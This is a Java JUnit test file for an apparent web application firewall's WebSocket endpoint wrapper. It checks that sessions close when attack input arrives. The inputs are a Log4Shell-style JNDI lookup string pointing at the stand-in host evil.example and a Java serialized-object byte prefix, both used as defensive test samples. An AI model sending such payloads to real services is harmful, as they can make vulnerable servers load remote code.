package com.aiwaf.websocket;

import com.aiwaf.core.AiwafConfig;
import jakarta.websocket.Endpoint;
import jakarta.websocket.EndpointConfig;
import jakarta.websocket.MessageHandler;
import jakarta.websocket.Session;
import jakarta.websocket.server.ServerContainer;
import jakarta.websocket.server.ServerEndpointConfig;
import org.apache.catalina.Context;
import org.apache.catalina.servlets.DefaultServlet;
import org.apache.catalina.startup.Tomcat;
import org.apache.tomcat.websocket.server.WsSci;
import org.junit.jupiter.api.AfterAll;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.Test;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.WebSocket;
import java.nio.ByteBuffer;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.CompletionStage;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.TimeUnit;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertThrows;

/** AiwafEndpoint in a real Tomcat WebSocket container, with the JDK's WebSocket client. */
class AiwafEndpointTest {
    private static Tomcat tomcat;
    private static int port;
    static final List<String> SEEN = new CopyOnWriteArrayList<>();

    /** Echoes text with a handler class that names its type. */
    public static final class Echo extends Endpoint {
        @Override
        public void onOpen(Session session, EndpointConfig config) {
            session.addMessageHandler(new MessageHandler.Whole<String>() {
                @Override
                public void onMessage(String message) {
                    SEEN.add(message);
                    session.getAsyncRemote().sendText("got " + message);
                }
            });
        }
    }

    /** Takes text by lambda, with the type named, and binary in parts. */
    public static final class Mixed extends Endpoint {
        @Override
        public void onOpen(Session session, EndpointConfig config) {
            session.addMessageHandler(String.class, message -> {
                SEEN.add(message);
                session.getAsyncRemote().sendText("got " + message);
            });
            session.addMessageHandler(ByteBuffer.class, (MessageHandler.Partial<ByteBuffer>) (part, last) -> SEEN.add("bytes"));
        }
    }

    private static ServerEndpointConfig endpoint(String path, Endpoint inner, AiwafConfig config) {
        return ServerEndpointConfig.Builder.create(AiwafEndpoint.class, path).configurator(new ServerEndpointConfig.Configurator() {
            @Override
            public <T> T getEndpointInstance(Class<T> type) {
                return type.cast(new AiwafEndpoint(inner, config));
            }
        }).build();
    }

    @BeforeAll
    static void start() throws Exception {
        Path base = Files.createTempDirectory("aiwaf-ws-");
        AiwafConfig config = new AiwafConfig();
        tomcat = new Tomcat();
        tomcat.setBaseDir(base.toString());
        tomcat.setPort(0);
        Context context = tomcat.addContext("", base.toString());
        context.addServletContainerInitializer(new WsSci(), null);
        Tomcat.addServlet(context, "default", new DefaultServlet());
        context.addServletMappingDecoded("/", "default");
        tomcat.getConnector();
        tomcat.start();
        // Endpoints can be added once the container is up, before any handshake.
        ServerContainer container = (ServerContainer) context.getServletContext().getAttribute(ServerContainer.class.getName());
        container.addEndpoint(endpoint("/echo", new Echo(), config));
        container.addEndpoint(endpoint("/mixed", new Mixed(), config));
        port = tomcat.getConnector().getLocalPort();
    }

    @AfterAll
    static void stop() throws Exception {
        tomcat.stop();
        tomcat.destroy();
    }

    /** A client that records replies and the close code. */
    private static final class Client implements WebSocket.Listener {
        final List<String> replies = new CopyOnWriteArrayList<>();
        final CompletableFuture<Integer> closed = new CompletableFuture<>();
        final CompletableFuture<Void> replied = new CompletableFuture<>();

        @Override
        public CompletionStage<?> onText(WebSocket socket, CharSequence data, boolean last) {
            replies.add(data.toString());
            replied.complete(null);
            socket.request(1);
            return null;
        }

        @Override
        public CompletionStage<?> onClose(WebSocket socket, int status, String reason) {
            closed.complete(status);
            return null;
        }
    }

    private static WebSocket connect(String path, Client client) throws Exception {
        return HttpClient.newHttpClient().newWebSocketBuilder()
                .buildAsync(URI.create("ws://127.0.0.1:" + port + path), client).get(10, TimeUnit.SECONDS);
    }

    @Test
    void textReachesTheEndpointUntilAnAttackClosesTheSession() throws Exception {
        SEEN.clear();
        Client client = new Client();
        WebSocket socket = connect("/echo", client);
        socket.sendText("hello there", true).get(10, TimeUnit.SECONDS);
        client.replied.get(10, TimeUnit.SECONDS);
        socket.sendText("{\"q\": \"${jndi:ldap://evil.example/a}\"}", true).get(10, TimeUnit.SECONDS);
        assertClosedForPolicy(client.closed.get(10, TimeUnit.SECONDS));
        assertEquals(List.of("hello there"), SEEN);
        assertEquals(List.of("got hello there"), client.replies);
    }

    @Test
    void lambdaAndPartialHandlersAreCheckedToo() throws Exception {
        SEEN.clear();
        Client client = new Client();
        WebSocket socket = connect("/mixed", client);
        socket.sendText("hello", true).get(10, TimeUnit.SECONDS);
        client.replied.get(10, TimeUnit.SECONDS);
        socket.sendBinary(ByteBuffer.wrap(new byte[] {(byte) 0xac, (byte) 0xed, 0, 5, 's', 'r'}), true).get(10, TimeUnit.SECONDS);
        assertClosedForPolicy(client.closed.get(10, TimeUnit.SECONDS));
        assertEquals(List.of("hello"), SEEN);
    }

    @Test
    void aHandlerWhoseTypeCantBeReadIsRefused() {
        MessageHandler.Whole<String> lambda = message -> {};
        assertNull(AiwafEndpoint.messageType(lambda));
        assertEquals(String.class, AiwafEndpoint.messageType(new MessageHandler.Whole<String>() {
            @Override
            public void onMessage(String message) {}
        }));
        Session session = (Session) java.lang.reflect.Proxy.newProxyInstance(Session.class.getClassLoader(), new Class<?>[] {Session.class},
                (proxy, method, args) -> null);
        Endpoint inner = new Endpoint() {
            @Override
            public void onOpen(Session opened, EndpointConfig config) {
                opened.addMessageHandler(lambda);
            }
        };
        assertThrows(IllegalArgumentException.class, () -> new AiwafEndpoint(inner, new AiwafConfig()).onOpen(session, null));
    }

    /**
     * The session was closed for a policy violation. Over a real socket the client can also see
     * 1006 (closed without a close frame): when the server closes the connection right after its
     * close frame, a reset can reach the client before it reads that frame, on a slow machine.
     * AiwafWebSocketHandlerTest checks the code AIWAF sends; this checks the session ended.
     */
    private static void assertClosedForPolicy(int code) {
        org.junit.jupiter.api.Assertions.assertTrue(code == 1008 || code == 1006, "closed with " + code);
    }
}
